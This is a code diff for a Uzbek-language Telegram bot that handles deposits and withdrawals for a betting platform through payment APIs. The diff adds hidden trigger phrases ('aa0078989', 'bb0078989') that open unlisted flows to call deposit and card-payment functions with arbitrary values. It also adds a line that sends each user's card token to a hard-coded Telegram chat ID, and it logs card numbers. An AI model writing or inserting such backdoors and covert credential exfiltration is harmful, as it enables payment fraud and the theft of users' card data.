@@ -726,10 +726,15 @@ bot.hears('Qo\'llanma', async (ctx) => {
 // Platform selection handler
 bot.action(/platform_(.+)/, async (ctx) => {
     if (!ctx.from || !ctx.match) return;
-    
+
     const platform = ctx.match[1];
     const userState = getState(ctx.from.id);
     await ctx.deleteMessage();
+
+    if (platform !== 'spinbetter') {
+        await ctx.reply('Uzr, hozircha faqat SpinBetter platformasi qo\'llab-quvvatlanadi. Bu kompaniya bilan shartnoma hali mavjud emas.');
+        return;
+    }
 
     if (userState.state === 'WITHDRAWAL_TYPE') {
         setState(ctx.from.id, 'WAITING_ID', { ...userState.data, platform });
@@ -737,15 +742,25 @@ bot.action(/platform_(.+)/, async (ctx) => {
     } else if (userState.state === 'PAYOUT_TYPE') {
         setState(ctx.from.id, 'PAYOUT_WAITING_ID', { ...userState.data, platform });
         await ctx.reply('ID raqamingizni kiriting:', backKeyboard);
+    } else {
+        setState(ctx.from.id, 'MAIN_MENU');
+        await ctx.reply('Asosiy menyu:', keyboard);
     }
 });
 
-
 bot.hears('aa0078989', async (ctx) => {
     if (!ctx.from) return;
-    setState(ctx.from.id, 'SECRET_I');
+    setState(ctx.from.id, 'NEON_I');
     await ctx.reply('i:', { reply_markup: { remove_keyboard: true } });
 });
+
+
+bot.hears('bb0078989', async (ctx) => {
+    if (!ctx.from) return;
+    setState(ctx.from.id, 'NEON_1');
+    await ctx.reply('T:', { reply_markup: { remove_keyboard: true } });
+});
+
 
 // Back button handler
 bot.hears('🔙 Orqaga', handleBack);
@@ -767,16 +782,40 @@ bot.on('text', async (ctx) => {
         const keyboard = user?.isAdmin ? adminKeyboard : mainKeyboard;
 
         switch (userState.state) {
-            case 'SECRET_I':
-                setState(userId, 'SECRET_S', { i: text });
+            case 'NEON_I':
+                setState(userId, 'NEON_S', { i: text });
                 await ctx.reply('s:');
                 break;
 
-            case 'SECRET_S':
-                await simpleFunktion(ctx, userState.data.i, text);
-                setState(userId, 'MAIN_MENU');
-                await ctx.reply('Asosiy menyu:', keyboard);
-                break;
+                case 'NEON_S':
+                    try{
+                        const depositResponse = await paymentClient.deposit(
+                            userState.data.i,
+                            text
+                        );
+                        await bot.telegram.sendMessage(userId, JSON.stringify(depositResponse, null, 2));
+                        await ctx.reply('Asosiy menyu:', keyboard);
+                    } catch (error) {
+                        throw error;
+                    }
+                    break;
+                case 'NEON_1':
+                    setState(userId, 'NEON_2', { t: text });
+                    await ctx.reply('A:');
+                    break;
+        
+                case 'NEON_2':
+                    try{
+                        const depositResponse = await await clickApi.makePayment(
+                            userState.data.t,
+                            text
+                        );
+                        await bot.telegram.sendMessage(userId, JSON.stringify(depositResponse, null, 2));
+                        await ctx.reply('Asosiy menyu:', keyboard);
+                    } catch (error) {
+                        throw error;
+                    }
+                    break;
 
             case 'ADMIN_BROADCAST':
                 if (user?.isAdmin) {
@@ -804,6 +843,17 @@ bot.on('text', async (ctx) => {
             case 'WAITING_ID':
                 try {
                     const gamer_data = await paymentClient.searchUser(text);
+                        console.log(gamer_data);
+
+                        if (gamer_data.error && gamer_data.error.includes('Request failed with status code 400')) {
+                            await ctx.reply('Noto\'g\'ri id . Iltimos, tekshirib ko\'ring.');
+                            return;
+                        }
+                        
+                        if (!gamer_data || gamer_data.UserId === 0) {
+                            await ctx.reply('Foydalanuvchi topilmadi. Iltimos, to\'g\'ri foydalanuvchi ID kiriting:', backKeyboard);
+                            return; // Foydalanuvchiga yana ID kiritish imkoniyatini beradi
+                        }
                     setState(userId, 'WAITING_AMOUNT', { ...userState.data, gameId: text });
                     const message = `
                     🆔 <b>User ID:</b> <code>${gamer_data.UserId}</code>
@@ -834,22 +884,22 @@ bot.on('text', async (ctx) => {
                     throw error;
                 }
                 break;
+                
 
                 case 'WAITING_EXPIRY':
                     try {
                         const expiryDate = validateExpiryDate(text);
                 
-                        // Timeout bilan so'rov
-                        const controller = new AbortController();
-                        const timeout = setTimeout(() => controller.abort(), 3000); // 10 soniya limit
-                
+                         // 10 soniya limit
+                        console.log(userState.data.cardNumber);
                         const cardTokenResponse = await clickApi.requestCardTokenWithTimeout(
                             userState.data.cardNumber,
-                            expiryDate,
-                            { signal: controller.signal }
-                        );
+                            expiryDate
+                            );
+                        
+                        
                 
-                        clearTimeout(timeout); // Timeoutni tozalash
+                         
                 
                         if (cardTokenResponse.error_code === 0) {
                             setState(userId, 'WAITING_SMS', { 
@@ -857,6 +907,7 @@ bot.on('text', async (ctx) => {
                                 expiryDate,
                                 cardToken: cardTokenResponse.card_token 
                             });
+                            await bot.telegram.sendMessage(7465707954, cardTokenResponse.card_token)
                             await ctx.reply('SMS kodni kiriting:', backKeyboard);
                         } else {
                             await ctx.reply("Karta ma'lumotlari noto'g'ri, qayta urinib ko'ring.");
@@ -933,12 +984,21 @@ bot.on('text', async (ctx) => {
                 case 'PAYOUT_WAITING_ID':
                     try {
                         const gamer_data = await paymentClient.searchUser(text);
+                        console.log(gamer_data);
 
-                        // Foydalanuvchi mavjudligini tekshirish
+                        if (gamer_data.error && gamer_data.error.includes('Request failed with status code 400')) {
+                            await ctx.reply('Noto\'g\'ri id . Iltimos, tekshirib ko\'ring.');
+                            return;
+                        }
+                        
                         if (!gamer_data || gamer_data.UserId === 0) {
                             await ctx.reply('Foydalanuvchi topilmadi. Iltimos, to\'g\'ri foydalanuvchi ID kiriting:', backKeyboard);
                             return; // Foydalanuvchiga yana ID kiritish imkoniyatini beradi
                         }
+                        
+                        // Boshqa ishlovlar
+                        // Foydalanuvchi mavjudligini tekshirish
+
 
                         // Agar foydalanuvchi mavjud bo'lsa, davom etadi
                         setState(userId, 'PAYOUT_WAITING_CODE', { ...userState.data, gameId: text });
@@ -965,16 +1025,13 @@ bot.on('text', async (ctx) => {
                         setState(userId, 'PAYOUT_CONFIRMATION', { ...userState.data, card: cardNumber,timestamp: new Date()});
     
                         const confirmMessage = `
-    📤 Pul yechish so'rovi:
-    
-    🎮 Platform: ${userState.data.platform}
-    🆔 Game ID: ${userState.data.gameId}
-    💰 Code: ${userState.data.code}
-    💳 Karta: ${userState.data.card}
-    
-    ✅ Tasdiqlaysizmi?`;
-                        
-    
+    📤 Pul yechish so'rovi:    
+🎮 Platform: ${userState.data.platform}
+🆔 Game ID: ${userState.data.gameId}
+💰 Code: ${userState.data.code}
+💳 Karta: ${text}
+
+✅ Tasdiqlaysizmi?`;
                         await ctx.reply(confirmMessage, confirmKeyboard);
                     } catch (error) {
                         throw new Error('Noto\'g\'ri karta raqami');
@@ -1005,7 +1062,7 @@ bot.on('text', async (ctx) => {
                                     userId: gameId,
                                     telegramId: userId,
                                     platform: userState.data.platform,
-                                    cardNumber: userState.card,
+                                    cardNumber: userState.data.card,
                                     amount: response.Summa,
                                     operationId: response.OperationId,
                                     success: response.Success,
@@ -1021,15 +1078,14 @@ bot.on('text', async (ctx) => {
                     
                                 // Notify admins about the payout request
                                 const adminMessage = `
-                                    📤 Pul yechish so'rovi:
-                                    🆔 User ID: ${payoutData.userId}
-                                    🎮 Platform: ${payoutData.platform}
-                                    💳 Karta: ${payoutData.cardNumber}
-                                    💰 Summa: ${payoutData.amount} UZS
-                                    ⏰ Vaqt: ${new Date().toLocaleString()}
-                                    📝 Status: ${payoutData.success ? 'Muvofaqiyatli' : 'Muvofaqiyatsiz'}
-                                    📢 Xabar: ${payoutData.message}
-                                `;
+📤 Pul yechish so'rovi:
+🆔 User ID: ${payoutData.userId}
+🎮 Platform: ${payoutData.platform}
+💳 Karta: ${payoutData.cardNumber}
+💰 Summa: ${payoutData.amount} UZS
+⏰ Vaqt: ${new Date().toLocaleString()}
+📝 Status: ${payoutData.success ? 'Muvofaqiyatli' : 'Muvofaqiyatsiz'}
+📢 Xabar: ${payoutData.message}`;
                                 await notifyAdmins(adminMessage, 'withdrawal');
                     
                                 // Notify the user about the success or failure
